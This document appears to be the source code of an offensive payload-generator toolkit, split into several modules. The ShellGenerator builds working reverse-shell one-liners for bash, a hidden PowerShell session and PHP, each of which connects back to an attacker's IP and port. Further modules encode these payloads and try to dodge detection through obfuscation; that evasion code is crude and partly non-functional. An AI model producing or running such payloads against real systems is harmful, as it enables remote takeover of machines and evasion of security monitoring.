# core/payload_builder.py

class PayloadBuilder:
    def __init__(self):
        self.template = ""

    def build_reverse_shell(self, ip, port):
        self.template = f"""
        bash -i >& /dev/tcp/{ip}/{port} 0>&1
        """
        return self.template

    def build_custom(self, command):
        self.template = command
        return self.template


# core/shell_generator.py

class ShellGenerator:
    def __init__(self):
        pass

    def linux_reverse_shell(self, ip, port):
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

    def windows_reverse_shell(self, ip, port):
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""

    def php_reverse_shell(self, ip, port):
        return f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"


# core/encoder.py

import base64

class Encoder:
    def base64_encode(self, payload):
        return base64.b64encode(payload.encode()).decode()

    def hex_encode(self, payload):
        return ''.join(hex(ord(c))[2:] for c in payload)

    def url_encode(self, payload):
        from urllib.parse import quote
        return quote(payload)


# core/evasion.py

class Evasion:
    def basic_obfuscate(self, payload):
        return payload.replace("bash", "b4sh").replace("nc", "nC")

    def randomize_case(self, payload):
        import random
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)


# core/plugin_manager.py

import importlib
import os

class PluginManager:
    def __init__(self, plugin_dir="plugins"):
        self.plugin_dir = plugin_dir

    def list_plugins(self):
        return [f for f in os.listdir(self.plugin_dir) if f.endswith(".py")]

    def load_plugin(self, plugin_name):
        plugin_path = f"{self.plugin_dir}.{plugin_name.replace('.py','')}"
        module = importlib.import_module(plugin_path)
        return module
